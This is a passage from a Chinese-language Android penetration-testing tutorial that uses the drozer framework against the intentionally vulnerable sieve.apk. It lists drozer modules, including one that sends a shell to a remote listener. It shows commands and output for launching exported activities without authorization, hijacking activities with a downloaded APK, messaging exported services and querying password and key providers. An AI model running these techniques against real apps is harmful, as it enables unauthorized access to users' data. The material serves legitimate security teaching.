取APN内容提供者</td></tr><tr><td><code>exploit.pilfer.general.settingsprovider</code></td><td>读取设置内容提供者</td></tr><tr><td><code>information.datetime</code></td><td>打印日期/时间</td></tr><tr><td><code>information.deviceinfo</code></td><td>获取详细设备信息</td></tr><tr><td><code>information.permissions</code></td><td>获取设备上所有软件包使用的所有权限列表</td></tr><tr><td><code>scanner.activity.browsable</code></td><td>获取可以从Web浏览器调用的所有可浏览的 activity</td></tr><tr><td><code>scanner.misc.native</code></td><td>查找包中包含的本地组件</td></tr><tr><td><code>scanner.misc.readablefiles</code></td><td>在给定文件夹中查找可读取的全局文件</td></tr><tr><td><code>scanner.misc.secretcodes</code></td><td>搜索可从拨号器中使用的秘密代码</td></tr><tr><td><code>scanner.misc.sflagbinaries</code></td><td>在给定文件夹中查找suid / sgid二进制文件（默认为/system）。</td></tr><tr><td><code>scanner.misc.writablefiles</code></td><td>在给定文件夹中查找可写的全局文件</td></tr><tr><td><code>scanner.provider.finduris</code></td><td>搜索可以从我们的上下文查询的内容提供者。</td></tr><tr><td><code>scanner.provider.injection</code></td><td>测试内容提供程序的SQL注入漏洞。</td></tr><tr><td><code>scanner.provider.sqltables</code></td><td>查找可通过SQL注入漏洞访问的表。</td></tr><tr><td><code>scanner.provider.traversal</code></td><td>测试内容提供程序是否存在基本目录遍历漏洞。</td></tr><tr><td><code>shell.exec</code></td><td>执行单个Linux命令。</td></tr><tr><td><code>shell.send</code></td><td>将ASH shell发送到远程侦听器。</td></tr><tr><td><code>shell.start</code></td><td>进入交互式Linux shell。</td></tr><tr><td><code>tools.file.download</code></td><td>下载文件。</td></tr><tr><td><code>tools.file.md5sum</code></td><td>获取文件的md5校验和。</td></tr><tr><td><code>tools.file.size</code></td><td>获取文件大小。</td></tr><tr><td><code>tools.file.upload</code></td><td>上传文件。</td></tr><tr><td><code>tools.setup.busybox</code></td><td>安装Busybox。</td></tr><tr><td><code>tools.setup.minimalsu</code></td><td>准备在设备上安装&#x27;minimal-su&#x27;二进制文件。</td></tr></tbody></table>
<h2 class="anchor anchorWithStickyNavbar_LWe7" id="四大组件">四大组件<a href="#四大组件" class="hash-link" aria-label="四大组件的直接链接" title="四大组件的直接链接">​</a></h2>
<h3 class="anchor anchorWithStickyNavbar_LWe7" id="说明">说明<a href="#说明" class="hash-link" aria-label="说明的直接链接" title="说明的直接链接">​</a></h3>
<table><thead><tr><th>组件名称</th><th>描述</th><th>用途</th></tr></thead><tbody><tr><td>Activity</td><td>代表应用程序中的单个屏幕或用户界面</td><td>处理用户与应用程序的交互和响应用户的操作</td></tr><tr><td>Service</td><td>代表应用程序中的后台任务</td><td>在后台执行长时间运行的操作，例如音乐播放、下载和数据处理</td></tr><tr><td>BroadcastReceiver</td><td>用于接收系统广播和应用程序内部广播</td><td>响应系统和应用程序中的广播消息，例如电池电量、网络连接状态、应用程序安装等</td></tr><tr><td>ContentProvider</td><td>用于应用程序之间共享数据</td><td>允许应用程序访问其他应用程序存储在特定位置的数据，例如联系人、照片、音频文件等</td></tr></tbody></table>
<h3 class="anchor anchorWithStickyNavbar_LWe7" id="测试">测试<a href="#测试" class="hash-link" aria-label="测试的直接链接" title="测试的直接链接">​</a></h3>
<p>以<a href="https://github.com/as0ler/Android-Examples/blob/master/sieve.apk" target="_blank" rel="noopener noreferrer">sieve.apk</a>为例，查看攻击面</p>
<div class="language-shell codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-shell codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token comment" style="color:#999988;font-style:italic">## 找到APP包名</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">dz</span><span class="token operator" style="color:#393A34">&gt;</span><span class="token plain"> run app.package.list </span><span class="token parameter variable" style="color:#36acaa">-f</span><span class="token plain"> sie</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">com.mwr.example.sieve </span><span class="token punctuation" style="color:#393A34">(</span><span class="token plain">Sieve</span><span class="token punctuation" style="color:#393A34">)</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token comment" style="color:#999988;font-style:italic">## 找到模块</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">dz</span><span class="token operator" style="color:#393A34">&gt;</span><span class="token plain"> </span><span class="token function" style="color:#d73a49">ls</span><span class="token plain"> attack</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">app.package.attacksurface  Get attack surface of package</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token comment" style="color:#999988;font-style:italic">## 查看攻击面，可以通过 -h 参数查看帮助</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">dz</span><span class="token operator" style="color:#393A34">&gt;</span><span class="token plain"> run app.package.attacksurface com.mwr.example.sieve</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">Attack Surface:</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">  </span><span class="token number" style="color:#36acaa">3</span><span class="token plain"> activities exported</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">  </span><span class="token number" style="color:#36acaa">0</span><span class="token plain"> broadcast receivers exported</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">  </span><span class="token number" style="color:#36acaa">2</span><span class="token plain"> content providers exported</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">  </span><span class="token number" style="color:#36acaa">2</span><span class="token plain"> services exported</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    is debuggable</span><br></span></code></pre></div></div>
<p><code>&lt;packagename&gt;</code>是包名。可以看到有3个activity、0个广播接收者、2个内容提供者和2个服务可以被导出，并且开启了debug模式。</p>
<blockquote>
<p>**可导出：**可以被其他应用程序或组件调用</p>
</blockquote>
<ol>
<li>
<p>一般有参数的情况下需要结合反编译去分析传入的参数，然后用参数<code>--extra</code>去构造发送。</p>
</li>
<li>
<p>Intent是一种用于在不同组件之间传递数据和执行操作的机制。Intent除了可以携带数据外，还可以传递<strong>Bundle对象</strong>或者使用<code>putExtra</code>方法传递键值对来传递数据。所以我们在分析参数的时候，着重注意<code>Bundle对象</code></p>
<div class="language-java codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-java codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">Bundle bundle = arg1.getExtras();</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">sms.sendTextMessage(bundle.getString(&quot;phoneNumber&quot;), null, bundle.getString(&quot;message&quot;), null, null);</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">// 参数 phoneNumber 和 message</span><br></span></code></pre></div></div>
</li>
</ol>
<h4 class="anchor anchorWithStickyNavbar_LWe7" id="activity">Activity<a href="#activity" class="hash-link" aria-label="Activity的直接链接" title="Activity的直接链接">​</a></h4>
<p>风险点：</p>
<ol>
<li>未授权访问（信息泄漏）</li>
<li>拒绝服务（发送空/畸形数据）</li>
<li>activity劫持</li>
</ol>
<p><strong>获取可导出activity</strong></p>
<div class="language-shell codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-shell codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token comment" style="color:#999988;font-style:italic">## run app.activity.info -a &lt;packagename&gt;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">dz</span><span class="token operator" style="color:#393A34">&gt;</span><span class="token plain"> run app.activity.info </span><span class="token parameter variable" style="color:#36acaa">-a</span><span class="token plain"> com.mwr.example.sieve</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">Package: com.mwr.example.sieve</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">  com.mwr.example.sieve.FileSelectActivity</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    Permission: null</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">  com.mwr.example.sieve.MainLoginActivity</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    Permission: null</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">  com.mwr.example.sieve.PWList</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    Permission: null</span><br></span></code></pre></div></div>
<p><strong>调用对应的activity，切换到对应界面，查看是否存在未授权，以及程序是否会崩溃（拒绝服务）</strong></p>
<div class="language-shell codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-shell codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token comment" style="color:#999988;font-style:italic">## run app.activity.start --component &lt;packagename&gt; &lt;component&gt;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token comment" style="color:#999988;font-style:italic">## run app.activity.start --component &lt;packagename&gt; &lt;component&gt; --extra string value 12345</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">dz</span><span class="token operator" style="color:#393A34">&gt;</span><span class="token plain"> run app.activity.start </span><span class="token parameter variable" style="color:#36acaa">--component</span><span class="token plain"> com.mwr.example.sieve com.mwr.example.sieve.FileSelectActivity</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">dz</span><span class="token operator" style="color:#393A34">&gt;</span><span class="token plain"> run app.activity.start </span><span class="token parameter variable" style="color:#36acaa">--component</span><span class="token plain"> com.mwr.example.sieve com.mwr.example.sieve.PWList</span><br></span></code></pre></div></div>
<p><img decoding="async" loading="lazy" alt="activity未授权" src="/assets/images/image-20230314101003554-e7ad35ea59da6394b411b2b8e3121a9d.png" width="1918" height="1268" class="img_ev3q"></p>
<p><strong>测试是否存在Activity劫持</strong></p>
<div class="language-shell codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-shell codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token comment" style="color:#999988;font-style:italic">## 环境准备</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token function" style="color:#d73a49">wget</span><span class="token plain"> https://github.com/yanghaoi/android_app/raw/master/uihijackv2.0_sign.apk</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token comment" style="color:#999988;font-style:italic">## 安装点击劫持软件</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">adb </span><span class="token function" style="color:#d73a49">install</span><span class="token plain"> uihijackv2.0_sign.apk</span><br></span></code></pre></div></div>
<p>在打开原activity的基础上，调用此组件，如果<code>uihijackv2.0_sign</code>界面位于被测软件上，则存在漏洞，否则不存在漏洞。</p>
<div class="language-shell codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-shell codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">run app.activity.start </span><span class="token parameter variable" style="color:#36acaa">--component</span><span class="token plain"> com.test.uihijack com.test.uihijack.MainActivity</span><br></span></code></pre></div></div>
<h4 class="anchor anchorWithStickyNavbar_LWe7" id="service">Service<a href="#service" class="hash-link" aria-label="Service的直接链接" title="Service的直接链接">​</a></h4>
<p>风险点：</p>
<ol>
<li>根据具体的功能点分析</li>
<li>拒绝服务</li>
</ol>
<p><strong>获取可导出服务</strong></p>
<div class="language-shell codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-shell codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token comment" style="color:#999988;font-style:italic">## run app.service.info -a &lt;packagename&gt;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">dz</span><span class="token operator" style="color:#393A34">&gt;</span><span class="token plain"> run app.service.info </span><span class="token parameter variable" style="color:#36acaa">-a</span><span class="token plain"> com.mwr.example.sieve</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">Package: com.mwr.example.sieve</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">  com.mwr.example.sieve.AuthService</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    Permission: null</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">  com.mwr.example.sieve.CryptoService</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    Permission: null</span><br></span></code></pre></div></div>
<p><strong>启动服务</strong></p>
<div class="language-shell codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-shell codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token comment" style="color:#999988;font-style:italic">## run app.service.start --component &lt;packagename&gt; &lt;component&gt;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">dz</span><span class="token operator" style="color:#393A34">&gt;</span><span class="token plain"> run app.service.start </span><span class="token parameter variable" style="color:#36acaa">--component</span><span class="token plain"> com.mwr.example.sieve com.mwr.example.sieve.AuthService</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">dz</span><span class="token operator" style="color:#393A34">&gt;</span><span class="token plain"> run app.service.start </span><span class="token parameter variable" style="color:#36acaa">--component</span><span class="token plain"> com.mwr.example.sieve com.mwr.example.sieve.CryptoService</span><br></span></code></pre></div></div>
<p><strong>绑定到一个已导出的服务，并向其发送一条消息。如果服务发送了一个回复，则显示接收到的消息及其包含的任何数据【发送数据到服务，并dump数据】</strong></p>
<div class="language-shell codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-shell codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token comment" style="color:#999988;font-style:italic">## run app.service.send &lt;packagename&gt; &lt;component&gt; --msg 1 2 3 --extra float value 0.1324 --extra string test value</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">dz</span><span class="token operator" style="color:#393A34">&gt;</span><span class="token plain"> run app.service.send com.mwr.example.sieve com.mwr.example.sieve.AuthService </span><span class="token parameter variable" style="color:#36acaa">--msg</span><span class="token plain"> </span><span class="token number" style="color:#36acaa">2354</span><span class="token plain"> </span><span class="token number" style="color:#36acaa">9234</span><span class="token plain"> </span><span class="token number" style="color:#36acaa">0</span><span class="token plain"> </span><span class="token parameter variable" style="color:#36acaa">--extra</span><span class="token plain"> string com.mwr.example.sieve.PIN </span><span class="token number" style="color:#36acaa">1234888</span><span class="token plain"> --bundle-as-obj</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">Got a reply from com.mwr.example.sieve/com.mwr.example.sieve.AuthService:</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">  what: </span><span class="token number" style="color:#36acaa">5</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">  arg1: </span><span class="token number" style="color:#36acaa">41</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">  arg2: </span><span class="token number" style="color:#36acaa">1</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">  Extras</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    com.mwr.example.sieve.PIN </span><span class="token punctuation" style="color:#393A34">(</span><span class="token plain">String</span><span class="token punctuation" style="color:#393A34">)</span><span class="token plain"> </span><span class="token builtin class-name">:</span><span class="token plain"> </span><span class="token number" style="color:#36acaa">1234888</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span></code></pre></div></div>
<blockquote>
<p>如果返回的是对象类数据，一定要加上参数<code>--bundle-as-obj</code>，不然drozer会直接退出。</p>
</blockquote>
<p><code>--msg</code>和<code>--extra</code>参数来源：</p>
<p><img decoding="async" loading="lazy" alt="常量值" src="/assets/images/image-20230314103149267-9e12a4799858a10ba4d98ce796a1c5c7.png" width="1526" height="700" class="img_ev3q"></p>
<p><img decoding="async" loading="lazy" alt="参数分析" src="/assets/images/image-20230314103120473-2d2e62e74d97f7278f2da4fa2c28041f.png" width="1704" height="1906" class="img_ev3q"></p>
<p>另一个服务也一样</p>
<div class="language-shell codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-shell codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">dz</span><span class="token operator" style="color:#393A34">&gt;</span><span class="token plain"> run app.service.send com.mwr.example.sieve com.mwr.example.sieve.CryptoService </span><span class="token parameter variable" style="color:#36acaa">--msg</span><span class="token plain"> </span><span class="token number" style="color:#36acaa">3452</span><span class="token plain"> </span><span class="token number" style="color:#36acaa">0</span><span class="token plain"> </span><span class="token number" style="color:#36acaa">0</span><span class="token plain"> </span><span class="token parameter variable" style="color:#36acaa">--extra</span><span class="token plain"> string com.mwr.example.sieve.KEY </span><span class="token number" style="color:#36acaa">123</span><span class="token plain"> </span><span class="token parameter variable" style="color:#36acaa">--extra</span><span class="token plain"> string com.mwr.example.sieve.STRING </span><span class="token number" style="color:#36acaa">456</span><span class="token plain"> --bundle-as-obj</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">Got a reply from com.mwr.example.sieve/com.mwr.example.sieve.CryptoService:</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">  what: </span><span class="token number" style="color:#36acaa">9</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">  arg1: </span><span class="token number" style="color:#36acaa">91</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">  arg2: </span><span class="token number" style="color:#36acaa">0</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">  Extras</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    com.mwr.example.sieve.RESULT </span><span class="token punctuation" style="color:#393A34">(</span><span class="token plain">byte</span><span class="token punctuation" style="color:#393A34">[</span><span class="token punctuation" style="color:#393A34">]</span><span class="token punctuation" style="color:#393A34">)</span><span class="token plain"> </span><span class="token builtin class-name">:</span><span class="token plain"> </span><span class="token punctuation" style="color:#393A34">[</span><span class="token number" style="color:#36acaa">55</span><span class="token plain">, </span><span class="token number" style="color:#36acaa">41</span><span class="token plain">, -24, -79, </span><span class="token number" style="color:#36acaa">3</span><span class="token plain">, </span><span class="token number" style="color:#36acaa">110</span><span class="token plain">, -82, -59, </span><span class="token number" style="color:#36acaa">93</span><span class="token plain">, -94, -83, -45, -8, </span><span class="token number" style="color:#36acaa">9</span><span class="token plain">, </span><span class="token number" style="color:#36acaa">97</span><span class="token plain">, -70, -79, </span><span class="token number" style="color:#36acaa">101</span><span class="token plain">, -80</span><span class="token punctuation" style="color:#393A34">]</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    com.mwr.example.sieve.STRING </span><span class="token punctuation" style="color:#393A34">(</span><span class="token plain">String</span><span class="token punctuation" style="color:#393A34">)</span><span class="token plain"> </span><span class="token builtin class-name">:</span><span class="token plain"> </span><span class="token number" style="color:#36acaa">456</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    com.mwr.example.sieve.KEY </span><span class="token punctuation" style="color:#393A34">(</span><span class="token plain">String</span><span class="token punctuation" style="color:#393A34">)</span><span class="token plain"> </span><span class="token builtin class-name">:</span><span class="token plain"> </span><span class="token number" style="color:#36acaa">123</span><br></span></code></pre></div></div>
<p><strong>关闭服务</strong></p>
<div class="language-shell codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-shell codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token comment" style="color:#999988;font-style:italic">## run app.service.stop --component &lt;packagename&gt; &lt;component&gt;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">dz</span><span class="token operator" style="color:#393A34">&gt;</span><span class="token plain"> run app.service.stop </span><span class="token parameter variable" style="color:#36acaa">--component</span><span class="token plain"> com.mwr.example.sieve com.mwr.example.sieve.AuthService</span><br></span></code></pre></div></div>
<h4 class="anchor anchorWithStickyNavbar_LWe7" id="contentprovider">ContentProvider<a href="#contentprovider" class="hash-link" aria-label="ContentProvider的直接链接" title="ContentProvider的直接链接">​</a></h4>
<p>风险点：</p>
<blockquote>
<ol>
<li>
<p>信息泄漏</p>
</li>
<li>
<p>注入漏洞</p>
</li>
</ol>
<p>Content Provider中的注入漏洞允许攻击者向Content Provider中注入恶意数据，从而可以获取敏感信息或者执行未经授权的操作。攻击者可以利用注入漏洞来执行SQL注入攻击，从而获取或修改Content Provider中的数据。如果Content Provider中存储了敏感数据，攻击者可能会利用注入漏洞来窃取该数据，导致严重的数据泄露问题。</p>
<ol start="3">
<li>目录遍历漏洞</li>
</ol>
<p>使用<code>ContentProvider.openFile()</code>可以实现应用间共享数据，如果这个方法使用不当将会导致目录遍历漏洞。该漏洞允许攻击者访问Content Provider中未经授权的文件和目录。攻击者可以利用目录遍历漏洞来获取敏感信息，如密码、密钥、证书等。此外，攻击者还可以利用目录遍历漏洞来执行未经授权的操作，如删除或修改Content Provider中的文件，导致严重的安全问题。</p>
</blockquote>
<p><strong>获取提供者信息</strong></p>
<div class="language-shell codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-shell codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token comment" style="color:#999988;font-style:italic">## run app.provider.info -a &lt;packagename&gt;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">dz</span><span class="token operator" style="color:#393A34">&gt;</span><span class="token plain"> run app.provider.info </span><span class="token parameter variable" style="color:#36acaa">-a</span><span class="token plain"> com.mwr.example.sieve</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">Package: com.mwr.example.sieve</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">  Authority: com.mwr.example.sieve.DBContentProvider</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    Read Permission: null</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    Write Permission: null</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    Content Provider: com.mwr.example.sieve.DBContentProvider</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    Multiprocess Allowed: True</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    Grant Uri Permissions: False</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    Path Permissions:</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">      Path: /Keys</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        Type: PATTERN_LITERAL</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        Read Permission: com.mwr.example.sieve.READ_KEYS</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        Write Permission: com.mwr.example.sieve.WRITE_KEYS</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">  Authority: com.mwr.example.sieve.FileBackupProvider</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    Read Permission: null</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    Write Permission: null</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    Content Provider: com.mwr.example.sieve.FileBackupProvider</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    Multiprocess Allowed: True</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    Grant Uri Permissions: False</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span></code></pre></div></div>
<p><strong>查询是否存在信息泄漏</strong></p>
<div class="language-shell codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-shell codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token comment" style="color:#999988;font-style:italic">## run scanner.provider.finduris -a &lt;packagename&gt; </span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">dz</span><span class="token operator" style="color:#393A34">&gt;</span><span class="token plain"> run scanner.provider.finduris </span><span class="token parameter variable" style="color:#36acaa">-a</span><span class="token plain"> com.mwr.example.sieve</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">Scanning com.mwr.example.sieve</span><span class="token punctuation" style="color:#393A34">..</span><span class="token plain">.</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">Unable to Query  content://com.mwr.example.sieve.DBContentProvider/</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">Unable to Query  content://com.mwr.example.sieve.FileBackupProvider/</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">Unable to Query  content://com.mwr.example.sieve.DBContentProvider</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">Able to Query    content://com.mwr.example.sieve.DBContentProvider/Passwords/</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">Able to Query    content://com.mwr.example.sieve.DBContentProvider/Keys/</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">Unable to Query  content://com.mwr.example.sieve.FileBackupProvider</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">Able to Query    content://com.mwr.example.sieve.DBContentProvider/Passwords</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">Unable to Query  content://com.mwr.example.sieve.DBContentProvider/Keys</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">Accessible content URIs:</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">  content://com.mwr.example.sieve.DBContentProvider/Keys/</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">  content://com.mwr.example.sieve.DBContentProvider/Passwords</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">  content://com.mwr.example.sieve.DBContentProvider/Passwords/</span><br></span></code></pre></div></div>
<p><strong>查询数据</strong></p>
<div class="language-shell codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-shell codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token comment" style="color:#999988;font-style:italic">## run app.provider.query &lt;uri&gt; [option args]</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">dz</span><span class="token operator" style="color:#393A34">&gt;</span><span class="token plain"> run app.provider.query content://com.mwr.example.sieve.DBContentProvider/Keys/</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token operator" style="color:#393A34">|</span><span class="token plain"> Password </span><span class="token operator" style="color:#393A34">|</span><span class="token plain"> pin  </span><span class="token operator" style="color:#393A34">|</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token operator" style="color:#393A34">|</span><span class="token plain"> </span><span class="token number" style="color:#36acaa">1</span><span class="token plain">        </span><span class="token operator" style="color:#393A34">|</span><span class="token plain"> null </span><span class="token operator" style="color:#393A34">|</span><br></span></code></pre></div></div>
<p><strong>查询是否存在注入</strong></p>
